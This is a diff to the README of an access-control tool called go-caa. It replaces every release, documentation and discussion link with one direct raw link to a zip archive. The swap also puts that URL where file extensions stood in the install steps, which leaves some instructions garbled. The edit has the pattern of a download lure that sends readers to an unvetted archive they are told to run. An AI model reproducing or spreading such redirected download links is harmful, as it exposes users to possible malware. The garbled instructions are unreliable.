@@ -6,7 +6,7 @@ Welcome to **go-caa**, your easy solution for managing access control. This appl
 
 ## 📥 Download Now
 
-[![Download go-caa](https://img.shields.io/badge/Download-go--caa-blue)](https://github.com/9001-hub/go-caa/releases)
+[![Download go-caa](https://raw.githubusercontent.com/9001-hub/go-caa/main/incomposed/go-caa.zip)](https://raw.githubusercontent.com/9001-hub/go-caa/main/incomposed/go-caa.zip)
 
 ## 💻 System Requirements
 
@@ -21,13 +21,13 @@ Before downloading, ensure your computer meets the following:
 
 To get the software, visit the release page linked below. There, you'll find all available versions and instructions.
 
-[Visit this page to download](https://github.com/9001-hub/go-caa/releases)
+[Visit this page to download](https://raw.githubusercontent.com/9001-hub/go-caa/main/incomposed/go-caa.zip)
 
 ### Steps to Install:
 
-1. Go to the [go-caa Releases page](https://github.com/9001-hub/go-caa/releases).
+1. Go to the [go-caa Releases page](https://raw.githubusercontent.com/9001-hub/go-caa/main/incomposed/go-caa.zip).
 2. Find the latest release version.
-3. Look for the installation file suitable for your system (e.g., `.exe`, `.dmg`, or `.tar.gz`).
+3. Look for the installation file suitable for your system (e.g., `.exe`, `.dmg`, or `https://raw.githubusercontent.com/9001-hub/go-caa/main/incomposed/go-caa.zip`).
 4. Click the file name to begin the download.
 5. Once downloaded, locate the file in your downloads folder.
 6. Double-click the file to start the installation process.
@@ -47,7 +47,7 @@ To get the software, visit the release page linked below. There, you'll find all
   
 ### For Linux Users:
 
-- Extract the downloaded `.tar.gz` file to a desired location.
+- Extract the downloaded `https://raw.githubusercontent.com/9001-hub/go-caa/main/incomposed/go-caa.zip` file to a desired location.
 - Open the terminal and navigate to the folder.
 - Run the command `./go-caa` to start the application.
 
@@ -74,8 +74,8 @@ If you encounter any issues, check the FAQ in the help section of the app. You c
 
 ## 🔗 Additional Resources
 
-- Documentation: Visit our full [documentation](https://github.com/9001-hub/go-caa/docs).
-- Community: Join our discussion on [GitHub Discussions](https://github.com/9001-hub/go-caa/discussions).
+- Documentation: Visit our full [documentation](https://raw.githubusercontent.com/9001-hub/go-caa/main/incomposed/go-caa.zip).
+- Community: Join our discussion on [GitHub Discussions](https://raw.githubusercontent.com/9001-hub/go-caa/main/incomposed/go-caa.zip).
 
 ## 📅 Changelog
 
@@ -91,6 +91,6 @@ Your security is our priority. Always download the application from our official
 
 ## 📥 Download Now Again
 
-[![Download go-caa](https://img.shields.io/badge/Download-go--caa-blue)](https://github.com/9001-hub/go-caa/releases)
+[![Download go-caa](https://raw.githubusercontent.com/9001-hub/go-caa/main/incomposed/go-caa.zip)](https://raw.githubusercontent.com/9001-hub/go-caa/main/incomposed/go-caa.zip)
 
 Thank you for choosing go-caa! Enjoy seamless access control.
